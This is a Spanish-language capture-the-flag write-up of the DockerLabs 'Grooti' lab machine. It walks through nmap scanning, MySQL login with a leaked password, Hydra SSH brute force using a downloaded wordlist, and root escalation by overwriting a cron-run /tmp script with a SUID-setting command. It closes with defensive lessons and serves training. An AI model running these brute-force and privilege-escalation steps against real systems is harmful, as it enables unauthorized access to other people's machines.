# Grooti — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Grooti  
**Fecha de creación:** 26/07/2025  
**Técnicas:** Nmap · MySQL remoto · Dirb · Interfaz numérica ZIP · Hydra SSH · crontab · malicious.sh · bash -p

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — comentario con pista y /imagenes](#2-enumeración-web--comentario-con-pista-y-imagenes)
3. [Acceso MySQL remoto — contraseña en README.txt](#3-acceso-mysql-remoto--contraseña-en-readmetxt)
4. [Interfaz /unprivate/secret — descarga ZIP con contraseña](#4-interfaz-unprivatesecret--descarga-zip-con-contraseña)
5. [Hydra SSH — fuerza bruta con wordlist del ZIP](#5-hydra-ssh--fuerza-bruta-con-wordlist-del-zip)
6. [Escalada de privilegios — crontab con malicious.sh](#6-escalada-de-privilegios--crontab-con-malicioussh)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh grooti.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
|_http-title: Grooti
```

> 💡 El escaneo también devuelve información de MySQL en el certificado SSL del puerto — hay un servicio de base de datos en la máquina.

---

## 2. Enumeración web — comentario con pista y /imagenes

Visitamos `http://172.17.0.2` — página temática de Groot con menú "Mis Fotos", "Mi base de datos", "Facturas de la nave". Código fuente:

```html
<!--
    I am Grooti...
    Creo que Rocket ha entrado a mi base de datos...
-->
```

Directorio `/imagenes/` con `README.txt` y `grooti.jpg`:

```
http://172.17.0.2/imagenes/README.txt
(password1) Encuentra donde ponerla ;)
```

> 💡 La contraseña **password1** hay que encontrar dónde usarla. El comentario habla de base de datos.

---

## 3. Acceso MySQL remoto — contraseña en README.txt

Con dirb encontramos una página oculta "Base de datos de Rocket" que muestra usuarios y un fichero de instrucciones descargable. El fichero contiene el comando:

```bash
mysql -u rocket -p -h 172.17.0.2 --ssl=0
```

Nos conectamos con la contraseña encontrada:

```bash
mysql -u rocket -p -h 172.17.0.2 --ssl=0
Enter password: password1
```

```
MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| files_secret       |
| information_schema |
| performance_schema |
+--------------------+

MySQL [(none)]> USE files_secret;
MySQL [files_secret]> SHOW TABLES;
| rutas |

MySQL [files_secret]> SELECT * FROM rutas;
+----+------------+-------------------------------+
| id | nombre     | ruta                          |
+----+------------+-------------------------------+
|  1 | imagenes   | /var/www/html/files/imagenes/ |
|  2 | documentos | /var/www/html/files/documentos/ |
|  3 | facturas   | /var/www/html/files/facturas/ |
|  4 | secret     | /unprivate/secret             |
+----+------------+-------------------------------+
```

---

## 4. Interfaz /unprivate/secret — descarga ZIP con contraseña

Visitamos `http://172.17.0.2/unprivate/secret` — "Grooti Terminal Access", interfaz que acepta un número del 1 al 100. Introducimos **16** (el nombre del usuario era `grooti16`):

La web descarga tres ficheros: `password16.zip`, `instrucciones.txt` y `grooti.zip`. El ZIP está protegido con la contraseña que ya teníamos — **password1**:

```bash
unzip password16.zip
# password: password1
```

```bash
cat password16.txt
admin123
123456
qwerty
letmein
roottoor
...
trustno1
...
```

Una wordlist personalizada con 34 contraseñas potenciales.

---

## 5. Hydra SSH — fuerza bruta con wordlist del ZIP

Creamos un fichero con los usuarios identificados en la web:

```bash
nano users.txt
# grooti
# rocket
# naia
```

Lanzamos Hydra con la wordlist del ZIP:

```bash
hydra -L users.txt -P password16.txt ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: grooti   password: YoSoYgRoOt
```

```bash
ssh grooti@172.17.0.2
grooti@172.17.0.2's password: YoSoYgRoOt
grooti@e3387a894df4:~$
```

Sin sudo, sin SUID relevante. Listamos los procesos:

```bash
grooti@e3387a894df4:~$ ps aux | cat
```

Vemos cron ejecutándose como root.

---

## 6. Escalada de privilegios — crontab con malicious.sh

```bash
grooti@e3387a894df4:~$ crontab -l
* * * * * /opt/cleanup.sh
```

```bash
grooti@e3387a894df4:~$ cat /opt/cleanup.sh
#!/bin/bash
bash /tmp/malicious.sh
```

El script de root ejecuta `/tmp/malicious.sh`. Leemos su contenido:

```bash
grooti@e3387a894df4:~$ cat /tmp/malicious.sh
#!/bin/bash
LOG_TEMP="/tmp/mi_log_temporal.log"
echo "Log temporal creado a $(date)" > "$LOG_TEMP"
echo "Archivo $LOG_TEMP creado."
sleep 2
rm -f "$LOG_TEMP"
echo "Archivo $LOG_TEMP eliminado después de 2 segundos."
```

El fichero pertenece a grooti y podemos sobreescribirlo:

```bash
grooti@e3387a894df4:~$ echo "chmod u+s /bin/bash" > /tmp/malicious.sh
grooti@e3387a894df4:~$ cat /tmp/malicious.sh
chmod u+s /bin/bash
```

Esperamos hasta el siguiente minuto a que el cron lo ejecute como root y luego:

```bash
grooti@e3387a894df4:~$ bash -p
bash-5.2# whoami
root
bash-5.2# cat grooti.txt
[banner ASCII de Groot]
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Contraseña MySQL expuesta en README.txt público** | `/imagenes/README.txt` | Acceso a base de datos |
| **Rutas internas en tabla MySQL (incluyendo /unprivate/secret)** | BD `files_secret` | Descubrimiento de interfaz oculta |
| **Wordlist descargable que contiene contraseña SSH** | ZIP de `/unprivate/secret` | Acceso SSH como grooti |
| **crontab de root ejecuta script escribible por usuario** | `/tmp/malicious.sh` | Escalada a root |

**Para defenderse:**
- No exponer credenciales de bases de datos en ficheros web accesibles.
- No almacenar rutas de recursos privados en bases de datos accesibles remotamente.
- Los scripts ejecutados por cron de root deben tener permisos restrictivos: `root:root 700`.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
